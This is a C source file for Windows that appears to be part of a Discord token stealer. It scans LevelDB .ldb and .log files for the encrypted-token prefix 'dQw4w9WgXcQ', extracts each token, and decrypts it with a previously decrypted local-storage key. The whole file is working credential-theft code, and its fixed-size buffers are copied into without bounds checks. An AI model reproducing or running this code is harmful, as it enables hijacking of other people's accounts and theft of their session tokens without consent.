#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>
#include "main.h"

int parse_file(char *file_path, const char *decrypted_local_storage_key,
	       int keylen)
{
	FILE *fp;
	long file_size = 0;
	char *file_contents;
	char *tmp_file_contents;
	int token_index;

	fp = fopen(file_path, "r");
	if (fp == NULL) {
		ERROR_PRINT("Failed to open file: %s\n", file_path);
		return 1;
	}
	fseek(fp, 0, SEEK_END);
	file_size = ftell(fp);
	rewind(fp);
	file_contents = malloc(file_size + 1);
	fread(file_contents, file_size, 1, fp);
	file_contents[file_size] = 0;
	fclose(fp);
	tmp_file_contents = file_contents;

	while ((token_index = find_substring(tmp_file_contents, file_size,
					     "dQw4w9WgXcQ")) != -1) {
		int i = 0;
		char *token = calloc(1, 1024);
		while (tmp_file_contents[token_index] != '"') {
			token[i] = tmp_file_contents[token_index];
			token_index++;
			i++;
		}
		decrypt_token(token, decrypted_local_storage_key, keylen);
		free(token);
		tmp_file_contents += token_index;
		file_size -= token_index;
		token_index = 0;
	}
	free(file_contents);
	return 0;
}

int find_files(const char *path, const char *decrypted_local_storage_key,
	       int decrypted_local_storage_key_size)
{
	char *tmp = calloc(1, 1024);
	WIN32_FIND_DATA ffd;
	HANDLE hFind = INVALID_HANDLE_VALUE;
	char *file_name = NULL;

	sprintf(tmp, "%s\\*", path);
	hFind = FindFirstFile(tmp, &ffd);
	if (hFind == INVALID_HANDLE_VALUE) {
		QUICK_PRINT("FindFirstFile failed (%lu)\n", GetLastError());
		return 1;
	}
	do {
		if (ffd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
			continue;
		} else {
			file_name = ffd.cFileName;
			if (strstr(file_name, ".ldb") ||
			    strstr(file_name, ".log")) {
				char *full_path = calloc(1, 1024);
				sprintf(full_path, "%s\\%s", path, file_name);
				parse_file(full_path,
					   decrypted_local_storage_key,
					   decrypted_local_storage_key_size);
				free(full_path);
			}
		}
	} while (FindNextFile(hFind, &ffd) != 0);
	FindClose(hFind);
	return 0;
}
